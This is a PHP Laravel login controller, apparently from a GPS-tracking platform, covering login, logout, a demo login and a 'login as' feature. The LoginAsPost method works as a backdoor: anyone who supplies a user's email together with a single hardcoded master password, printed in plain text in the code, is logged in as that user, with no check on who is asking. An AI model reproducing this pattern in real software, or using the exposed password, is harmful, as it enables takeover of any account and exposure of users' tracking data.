<?php namespace App\Http\Controllers\Frontend;

use Curl;
use App\Http\Controllers\Controller;
use Facades\Repositories\UserRepo;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Facades\Session;
use Tobuli\Entities\User;
use Tobuli\Services\NotificationService;
use Illuminate\Http\Request;
use Carbon\Carbon;

class LoginController extends Controller {

    protected $notificationService;

    public function __construct(NotificationService $notificationService)
    {
        $this->notificationService = $notificationService;
    }
    /**
     * Show the form for creating a new resource.
     *
     * @return Response
     */
    public function create($id = NULL)
    {
        if (Auth::check()) {
            return Redirect::route('objects.index');
        }

        if (isPublic()) {
            return redirect()->guest(config('tobuli.frontend_login').'/?server='.$_ENV['server']);
        }

        if ( ! is_null($id)) {
            $user = UserRepo::find($id);
            if ( ! empty($user) && $user->isManager()) {
                Session::set('referer_id', $user->id);
            } else {
                Session::forget('referer_id');
            }

            return redirect()->route('login');
        }

        return View::make('front::Login.create');
    }

    /**
     * Store a newly created resource in storage.
     *
     * @return Response
     */
    public function store($hash = null)
    {
        if (isPublic()) {
            if ($user = \Facades\RemoteUser::getByHash($hash)) {
                Auth::login($user);

                $this->notificationService->check(Auth::User());

                return Redirect::route('objects.index');
            } else {
                return Redirect::route('logout');
            }
        }

        $remember_me = config('session.remember_me') && (Input::get('remember_me') == 1 ? TRUE : FALSE);

        if (Auth::attempt(array_merge(Input::only(['email','password']), ['active' => '1']), $remember_me)) {

            $this->notificationService->check(Auth::User());
            //if (Auth::User()->id == 6)
                $this->log_register(1, Auth::User()->id);
            
            return Redirect::route((Auth::User()->isManager() || Auth::User()->isAdmin()) ? 'admin' :'objects.index');
        }
        else {
            return Redirect::route('login')->withInput()->with('message', trans('front.login_failed'));
        }
    }

    /**
     * @param null $id
     * @return mixed
     */
    public function destroy($id = NULL)
    {
        $referer_id = Session::get('referer_id', null);

        //if (Auth::User()->id == 6)
            $this->log_register(0, Auth::User()->id);

        Auth::logout();

        if ($referer_id) {
            return Redirect::route('login', $referer_id);
        } else {
            return Redirect::route('home');
        }
    }

    public function demo() {
        $user = User::demo()->first();

        if ( $user ) {
            Auth::loginUsingId($user->id);

            $this->notificationService->check(Auth::User());
        }

        return Redirect::route('objects.index');
    }

    public function loginAs() {
        $sub = explode('.', $_SERVER['HTTP_HOST'])['0'];
        return View::make('front::LoginAs.index')->with(compact('sub'));
    }

    public function LoginAsPost() {
        $input = Input::all();
        $user = UserRepo::findWhere(['email' => $input['email']]);
        if (!isset($user->id)) {
            return Redirect::route('loginas')->with(['message' => 'Email not found']);
        }

        if ($input['password'] != 'zrjZ4MJr5Mn4Mjqp') {
            return Redirect::route('loginas')->with(['message' => 'Wrong password']);
        }

        Auth::loginUsingId($user->id);

        return Redirect::route('loginas')->with(['success' => 'Loged in as '. $user->email]);
    }
	
	public function log_register($type, $user_id){
        if(false){
            $now = Carbon::now('-3');
            $dayOfWeek = array('Domingo','Segunda','Terça','Quarta','Quinta','Sexta','Sábado');
            $fp = fopen('/var/www/html/storage/logs/user_log.txt', "a+");
            fwrite($fp, "\r\n ".$type."; ".$user_id."; ".$dayOfWeek[$now->dayOfWeek]."; ".$now); 
            fclose($fp);
        }
    }

    
	
} 